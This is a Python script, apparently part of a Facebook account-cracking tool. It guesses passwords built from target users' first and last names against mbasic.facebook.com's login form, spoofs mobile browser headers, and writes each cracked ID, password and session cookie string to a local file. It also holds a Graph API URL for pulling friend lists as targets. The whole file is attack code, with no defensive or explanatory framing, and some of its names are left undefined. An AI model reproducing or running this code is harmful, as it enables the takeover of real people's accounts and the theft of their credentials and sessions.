import requests, os, json, sys, random, uuid, re, time
import string
from concurrent.futures import ThreadPoolExecutor as lol
from requests.exceptions import ConnectionError as CError
from bs4 import BeautifulSoup as parser

teer = ("|");
idx = [];
loop = 0;
take_file = []
new_file = [];
passwords = [];
proxer = [];
oku = []
import string, uuid, json, subprocess

cpu = [];
tfu = []
G = '\x1b[1;92m'
R = '\x1b[1;91m'
W = '\x1b[1;97m'
S = '\x1b[1;96m'
Y = '\x1b[1;93m'
yp = '\x1b[1;95m'
C = '\x1b[0m'
import platform

g_p_u = ("https://graph.facebook.com/{}?fields=friends.limit(50000)&access_token={}")

os.system('git pull')

import uuid
import hashlib
import random
import string
import requests
import time
import subprocess
import random


def rand_between(min, max):
    return str(random.randint(min, max))


def rand_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def basic(uid, f, l):
    global loop, cpu, oku
    sys.stdout.write('{}  [ {}/{} ] OK:{}\r'.format(C, str(loop), str(len(idx)), str(len(oku))))
    ses = requests.Session()
    url = "mbasic.facebook.com"

    for pw in p_:
        try:
            pw = pw.replace('first', f).replace('last', l).replace('First', f.capitalize()).replace('Last',
                                                                                                    l.capitalize())

            login_url = "https://{}/login/device-based/password/?uid={}&flow=login_no_pin&refsrc=deprecated&_rdr".format(
                url, uid)
            headers = {
                'Host': url,
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Java"',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': f'https://{url}/login/device-based/',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-us'
            }

            response = ses.get(login_url, headers=headers).text
            soup = BeautifulSoup(response, "html.parser")
            form_action = soup.find("form", method="post").get("action")
            form_data = {_.get('name'): _.get('value') for _ in
                         soup.find('form', {'method': 'post'}).findAll('input', {'name': ['lsd', 'jazoest']})}

            form_data.update({
                'uid': uid,
                'next': f'https://{url}/login/save-device/',
                'flow': 'login_no_pin',
                'encpass': '#PWD_BROWSER:0:{}:{}'.format(random.randint(1111111111, 9999999999), pw),
                'submit': 'Log in'
            })

            post_url = "https://{}{}".format(url, form_action)
            headers['Referer'] = login_url
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            response = ses.post(post_url, data=form_data, headers=headers, allow_redirects=False)

            if "c_user" in ses.cookies.get_dict():
                print("\r {} [Mr-saifii-ok] {} {}".format(G, uid, C))
                try:
                    coki = ';'.join(["%s=%s" % (k, v) for k, v in ses.cookies.get_dict().items()])
                except:
                    coki = 'no'
                oku.append(uid)
                url_str = str(uid)
                idz = url_str + teer + pw + teer + coki + '\n'
                open('ids_original_pass.txt', 'a').write(idz)

            elif "checkpoint" in ses.cookies.get_dict():
                break
            else:
                continue
        except Exception as e:
            time.sleep(10)
            continue
    loop += 1
